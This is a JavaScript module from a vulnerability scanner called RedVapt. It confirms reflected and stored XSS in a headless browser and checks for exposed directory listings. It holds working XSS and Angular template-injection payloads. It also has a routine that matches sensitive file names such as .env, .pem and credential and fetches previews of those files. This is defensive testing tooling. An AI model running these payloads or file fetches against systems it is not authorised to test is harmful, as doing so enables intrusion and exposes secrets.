/**
 * browserVerifier.js — Refined Browser-Rendered Verification Engine (RedVapt)
 *
 * GOAL: "No proof = No vulnerability"
 * This module ONLY returns CONFIRMED findings when it has real execution proof.
 *
 * CONFIRMATION METHODS (strong → weak):
 *   [P1] JS Dialog fired (alert/confirm/prompt) containing our unique token
 *   [P2] Document title changed to our token (works even with alert blocked)
 *   [P3] Console log contains our token (rare but useful)
 *
 * DOM reflection alone is NOT treated as confirmed.
 * It can be returned as "suspected" evidence (optional).
 *
 * PERFORMANCE:
 *   - Reuses one browser + context per verification call
 *   - Tries limited payloads (max 6)
 *   - Stops immediately when confirmed
 *
 * SECURITY:
 *   - No disable-web-security flag (avoids fake positives)
 *   - Realistic browser rendering
 */

import { chromium } from 'playwright';
import axios from 'axios';

const PAGE_LOAD_TIMEOUT = 12_000;
const VERIFICATION_TIMEOUT = 20_000;
const RENDER_WAIT_MS = 2000;
const ALERT_WAIT_MS = 1500;
const MAX_PAYLOADS = 6;

// ──────────────────────────────────────────────────────────────────────────────
// Token Generator
// ──────────────────────────────────────────────────────────────────────────────

function generateXssToken() {
  return `REDVAPT_${Math.random().toString(36).slice(2, 10).toUpperCase()}`;
}

// ──────────────────────────────────────────────────────────────────────────────
// Payload Builder (safe + proof-driven)
// ──────────────────────────────────────────────────────────────────────────────

function buildVerificationPayloads(token, techStack = 'unknown') {
  const payloads = [
    // Strong signal: title change (works even when alerts blocked by CSP)
    `"><img src=x onerror="document.title='${token}'">`,
    `'><img src=x onerror='document.title="${token}"'>`,

    // Dialog-based proof
    `<svg onload="alert('${token}')">`,
    `"><svg onload="alert('${token}')">`,

    // Console-based proof
    `"><img src=x onerror="console.log('${token}')">`,
  ];

  // Angular template injection (only if angular)
  if (techStack === 'angular') {
    payloads.unshift(`{{constructor.constructor("document.title='${token}'")()}}`);
    payloads.unshift(`{{constructor.constructor("alert('${token}')")()}}`);
  }

  // Deduplicate & cap
  return [...new Set(payloads)].slice(0, MAX_PAYLOADS);
}

// ──────────────────────────────────────────────────────────────────────────────
// Cookie Utilities
// ──────────────────────────────────────────────────────────────────────────────

async function applyCookieString(context, targetUrl, cookieString) {
  if (!cookieString) return;

  try {
    const u = new URL(targetUrl);
    const cookies = cookieString
      .split(';')
      .map(c => c.trim())
      .filter(Boolean)
      .map(pair => {
        const idx = pair.indexOf('=');
        if (idx === -1) return null;
        const name = pair.slice(0, idx).trim();
        const value = pair.slice(idx + 1).trim();
        if (!name || !value) return null;
        return { name, value, domain: u.hostname, path: '/' };
      })
      .filter(Boolean);

    if (cookies.length > 0) {
      await context.addCookies(cookies);
    }
  } catch (err) {
    console.warn(`[BrowserVerifier] Failed to apply cookies: ${err.message}`);
  }
}

// ──────────────────────────────────────────────────────────────────────────────
// Core Browser Verification
// ──────────────────────────────────────────────────────────────────────────────

/**
 * verifyXssInBrowser
 *
 * Returns confirmed=true ONLY if it detects actual JS execution proof.
 */
export async function verifyXssInBrowser(
  url,
  param,
  method = 'GET',
  formData = {},
  sessionCookie = '',
  techStack = 'unknown'
) {
  const token = generateXssToken();
  const payloads = buildVerificationPayloads(token, techStack);

  let browser;
  let context;

  try {
    browser = await chromium.launch({
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'],
    });

    context = await browser.newContext({
      ignoreHTTPSErrors: true,
      userAgent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36 RedVapt/2.0',
    });

    await applyCookieString(context, url, sessionCookie);

    const page = await context.newPage();

    let dialogProof = false;
    let dialogMsg = '';
    let consoleProof = false;

    page.on('dialog', async dialog => {
      const msg = dialog.message();
      if (msg.includes(token)) {
        dialogProof = true;
        dialogMsg = msg;
      }
      await dialog.dismiss();
    });

    page.on('console', msg => {
      if (msg.text().includes(token)) {
        consoleProof = true;
      }
    });

    // Baseline title
    let baseTitle = '';
    try {
      baseTitle = await page.title();
    } catch {}

    for (const payload of payloads) {
      let targetUrl = url;

      try {
        if (method.toUpperCase() === 'GET') {
          const sep = url.includes('?') ? '&' : '?';
          targetUrl = `${url}${sep}${param}=${encodeURIComponent(payload)}`;

          await page.goto(targetUrl, {
            waitUntil: 'domcontentloaded',
            timeout: PAGE_LOAD_TIMEOUT,
          });
        } else {
          // POST submission via JS form injection
          await page.goto(url, { waitUntil: 'domcontentloaded', timeout: PAGE_LOAD_TIMEOUT });

          await page.evaluate(({ formData, param, payload, url }) => {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = url;

            const allFields = { ...formData, [param]: payload };

            for (const [k, v] of Object.entries(allFields)) {
              const input = document.createElement('input');
              input.name = k;
              input.value = String(v);
              form.appendChild(input);
            }

            document.body.appendChild(form);
            form.submit();
          }, { formData, param, payload, url });
        }

        // Wait for SPA rendering
        await page.waitForTimeout(RENDER_WAIT_MS);

        // Wait for possible XSS trigger
        await page.waitForTimeout(ALERT_WAIT_MS);

        // Proof check: title change
        let titleProof = false;
        let newTitle = '';
        try {
          newTitle = await page.title();
          if (newTitle && newTitle.includes(token)) titleProof = true;
        } catch {}

        // Proof check: document.title via evaluate (more reliable)
        let evalTitleProof = false;
        try {
          const evalTitle = await page.evaluate(() => document.title);
          if (evalTitle && evalTitle.includes(token)) evalTitleProof = true;
        } catch {}

        const confirmed = dialogProof || titleProof || evalTitleProof || consoleProof;

        if (confirmed) {
          const proofType = dialogProof
            ? 'dialog_alert'
            : (titleProof || evalTitleProof)
              ? 'document_title'
              : 'console_log';

          const evidenceText = dialogProof
            ? `XSS CONFIRMED: JavaScript dialog executed with token "${token}". Message: "${dialogMsg}"`
            : (titleProof || evalTitleProof)
              ? `XSS CONFIRMED: document.title changed to include token "${token}". Title: "${newTitle}"`
              : `XSS CONFIRMED: console output contained token "${token}".`;

          return {
            confirmed: true,
            severity: 'High',
            payload,
            token,
            evidence: {
                request: `${method.toUpperCase()} ${targetUrl}`,
                response_snippet: evidenceText
            },
            proofType,
            method: method.toUpperCase(),
            parameter: param,
            targetUrl,
          };
        }

        // Reset possible proof flags for next payload attempt
        dialogProof = false;
        dialogMsg = '';
        consoleProof = false;

        // Reset title if modified but not tokenized
        try {
          const currentTitle = await page.title();
          if (currentTitle !== baseTitle) {
            await page.evaluate(t => { document.title = t; }, baseTitle);
          }
        } catch {}

      } catch (err) {
        // navigation timeout or blocked payload — continue to next payload
        continue;
      }
    }

    return {
      confirmed: false,
      severity: 'Info',
      payload: null,
      token,
      evidence: {
          request: `${method.toUpperCase()} ${url}`,
          response_snippet: 'No execution proof detected in browser (no dialog/title/console token).'
      },
      proofType: null,
      method: method.toUpperCase(),
      parameter: param,
      targetUrl: url,
    };

  } catch (err) {
    return {
      confirmed: false,
      severity: 'Info',
      payload: null,
      token,
      evidence: {
          request: `${method.toUpperCase()} ${url}`,
          response_snippet: `Browser verifier error: ${err.message}`
      },
      proofType: null,
      method: method.toUpperCase(),
      parameter: param,
      targetUrl: url,
    };
  } finally {
    if (context) await context.close().catch(() => {});
    if (browser) await browser.close().catch(() => {});
  }
}

// ──────────────────────────────────────────────────────────────────────────────
// Stored XSS Verification (inject → render → confirm execution proof)
// ──────────────────────────────────────────────────────────────────────────────

export async function verifyStoredXss(injectUrl, renderUrl, injectBody, sessionCookie = '', techStack = 'unknown') {
  const token = generateXssToken();

  const bodyWithToken = Object.fromEntries(
    Object.entries(injectBody).map(([k, v]) => [
      k,
      typeof v === 'string'
        ? v.replaceAll('INJECT_TOKEN', token)
        : v,
    ])
  );

  // Ensure payload includes strong proof method
  for (const key of Object.keys(bodyWithToken)) {
    if (typeof bodyWithToken[key] === 'string') {
      if (!bodyWithToken[key].includes(token)) {
        bodyWithToken[key] += `"><img src=x onerror="document.title='${token}'">`;
      }
    }
  }

  // Step 1: Inject
  let injectResp;
  try {
    injectResp = await axios.post(injectUrl, bodyWithToken, {
      headers: {
        'Content-Type': 'application/json',
        ...(sessionCookie ? { Cookie: sessionCookie } : {}),
      },
      timeout: 10_000,
      validateStatus: () => true,
    });

    if (injectResp.status >= 400) {
      return {
        confirmed: false,
        evidence: {
            request: `POST ${injectUrl}`,
            response_snippet: `Injection failed: server returned ${injectResp.status}`
        },
        token,
        injectUrl,
        renderUrl,
      };
    }
  } catch (err) {
    return {
      confirmed: false,
      evidence: `Injection request failed: ${err.message}`,
      token,
      injectUrl,
      renderUrl,
    };
  }

  // Step 2: Render + verify
  const result = await verifyXssInBrowser(renderUrl, '__stored__', 'GET', {}, sessionCookie, techStack);

  if (result.confirmed) {
    return {
      confirmed: true,
      severity: 'High',
      token,
      injectUrl,
      renderUrl,
      evidence: {
          request: `Injection: POST ${injectUrl}\nVerification: GET ${renderUrl}`,
          response_snippet: `Stored XSS CONFIRMED. Payload injected into ${injectUrl} and executed at ${renderUrl}. Proof: ${result.proofType}`
      },
      proof: result,
    };
  }

  return {
    confirmed: false,
    severity: 'Info',
    token,
    injectUrl,
    renderUrl,
    evidence: {
        request: `POST ${injectUrl} -> GET ${renderUrl}`,
        response_snippet: `No execution proof at render URL after injection. Injection status=${injectResp.status}`
    },
  };
}

// ──────────────────────────────────────────────────────────────────────────────
// Directory Listing / FTP Exposure Verification (Refined)
// ──────────────────────────────────────────────────────────────────────────────

export async function verifyFtpExposure(ftpUrl) {
  const findings = [];
  const client = axios.create({ timeout: 8_000, validateStatus: () => true });

  try {
    const resp = await client.get(ftpUrl);
    if (resp.status !== 200) return findings;

    const body = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data);

    if (!/Index of \/|Parent Directory|Directory listing/i.test(body)) return findings;

    const linkPattern = /href="([^"?#]{1,200})"/g;
    let m;
    const files = [];

    while ((m = linkPattern.exec(body)) !== null) {
      const raw = m[1].trim();

      if (!raw) continue;
      if (raw === '../') continue;
      if (raw.startsWith('?')) continue;
      if (raw.includes('C=N') || raw.includes('C=M')) continue;

      const cleaned = raw.replace(/^\//, '');
      if (!cleaned || cleaned.includes('..')) continue;

      files.push(cleaned);
    }

    if (files.length === 0) return findings;

    findings.push({
      type: 'Directory Listing',
      severity: 'Medium',
      url: ftpUrl,
      evidence: {
          request: `GET ${ftpUrl}`,
          response_snippet: `Directory listing detected. Exposed files: ${files.slice(0, 10).join(', ')}`
      },
      files: files.slice(0, 50),
      confirmed: true,
      proofType: 'html_directory_listing',
    });

    // Sensitive file check
    const SENSITIVE = [
      /\.bak$/i, /\.sql$/i, /\.env$/i, /\.zip$/i, /\.tar\.gz$/i,
      /package\.json/i, /config\./i, /secret/i, /credential/i,
      /\.key$/i, /\.pem$/i, /\.log$/i, /backup/i, /dump/i,
    ];

    for (const file of files.filter(f => SENSITIVE.some(p => p.test(f))).slice(0, 10)) {
      try {
        const fileUrl = `${ftpUrl.replace(/\/$/, '')}/${file}`;
        const fileResp = await client.get(fileUrl);

        if (fileResp.status === 200) {
          const preview = typeof fileResp.data === 'string'
            ? fileResp.data.slice(0, 400)
            : JSON.stringify(fileResp.data).slice(0, 400);

          findings.push({
            type: 'Sensitive File Exposure',
            severity: 'High',
            url: fileUrl,
            confirmed: true,
            proofType: 'direct_file_access',
            evidence: {
                request: `GET ${fileUrl}`,
                response_snippet: `Sensitive file accessible: ${file}. Preview: ${preview}`
            },
          });
        }
      } catch {}
    }

  } catch {}

  return findings;
}

// ──────────────────────────────────────────────────────────────────────────────
// Availability Check
// ──────────────────────────────────────────────────────────────────────────────

export async function isBrowserVerifierAvailable() {
  try {
    const browser = await chromium.launch({ headless: true });
    await browser.close();
    return true;
  } catch {
    return false;
  }
}

// ──────────────────────────────────────────────────────────────────────────────
// Exports
// ──────────────────────────────────────────────────────────────────────────────

export default {
  verifyXssInBrowser,
  verifyStoredXss,
  verifyFtpExposure,
  isBrowserVerifierAvailable,
};
